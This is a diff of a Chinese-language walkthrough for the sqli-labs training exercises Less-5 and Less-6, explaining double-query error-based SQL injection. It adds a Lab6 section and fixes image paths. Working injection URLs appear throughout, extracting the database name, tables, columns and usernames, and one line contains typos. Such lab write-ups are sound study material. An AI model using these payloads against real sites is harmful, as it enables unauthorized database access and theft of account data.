@@ -1,6 +1,6 @@
 # Lab5 -- Double Injection - Single Quotes
 
-+ 输入`?id=1`没有任何数据显示在网页上，只有一句`You are in...`，我要的数据啊喂
++ 输入`?id=1`没有任何数据显示在网页上，只有一句`You are in...`，我要的数据啊喂 -- 哦对了，这就是盲注，网页只会返回对或错之类的信息，我们要的数据库信息都不会显示在前端
 + 这里是双注入的原理解释链接
   + https://blog.csdn.net/lixiangminghate/article/details/80466257
   + https://mochazz.github.io/2017/09/23/Double_%20SQL_Injection/#0x01-%E5%8F%8C%E6%9F%A5%E8%AF%A2这个链接更好一些
@@ -34,7 +34,7 @@
 http://localhost/sqli-labs-master/Less-5/?id=0' union select 1,count(*),concat_ws(":",(select database()),floor(rand(0)*2)) as a from information_schema.columns group by a --+
 ```
 
-![2](C:\Users\Administrator\Desktop\Sqli_Analysis\images\2.png)
+![2](.\images\2.png)
 
 2. 得到当前数据库的数据表们 -- 这里只能通过limit一个一个查询
 
@@ -44,7 +44,7 @@ http://localhost/sqli-labs-master/Less-5/
 LIMIT 从0，1到3，1得到emails，referers，uagents和users
 ```
 
-![3](C:\Users\Administrator\Desktop\Sqli_Analysis\images\3.png)
+![3](.\images\3.png)
 
 3. 选择账户相关的数据表，得到其的字段名称-- 这里只能通过limit一个一个查询
 
@@ -54,7 +54,7 @@ http://localhost/sqli-labs-master/Less-5/
 得到id,username,password三个字段
 ```
 
-![4](C:\Users\Administrator\Desktop\Sqli_Analysis\images\4.png)
+![4](.\images\4.png)
 
 4. 根据字段名称在数据表中查询具体数据 -- 这里只能通过limit一个一个查询
 
@@ -63,7 +63,7 @@ http://localhost/sqli-labs-master/Less-5/
 ?id=0' union select 1,count(*),concat_ws(":",(select username from security.users LIMIT 0,1),floor(rand(0)*2)) as a from information_schema.columns group by a --+
 ```
 
-![5](C:\Users\Administrator\Desktop\Sqli_Analysis\images\5.png)
+![5](.\images\5.png)
 
 + 当然，以上的limit一个一个查询太慢了，可以考虑用python来帮我们做这件事情，参考了https://mochazz.github.io/2017/09/23/Double_%20SQL_Injection/#0x01-%E5%8F%8C%E6%9F%A5%E8%AF%A2这份链接，写出python脚本进行sql注入
 
@@ -74,5 +74,14 @@ http://localhost/sqli-labs-master/Less-5/
 ?id=0' union select 1,count(*),count_ws(":",(select database()),floor(random(0)*2)) as a from information_schema.columns group by a --+
 ```
 
-![6](C:\Users\Administrator\Desktop\Sqli_Analysis\images\6.png)
+![6](.\images\6.png)
+
+# Lab6 -- Double Injection -- Double Quotes
+
++ 流程跟Lab5是一样的，除了单引号变为了双引号，这里不多赘述
+
+```
+http://localhost/sqli-labs-master/Less-6/
+?id=0" union select 1,count(*),concat_ws(":",(select username from security.users LIMIT 0,1),floor(rand(0)*2)) as a from information_schema.columns group by a --+
+```
 
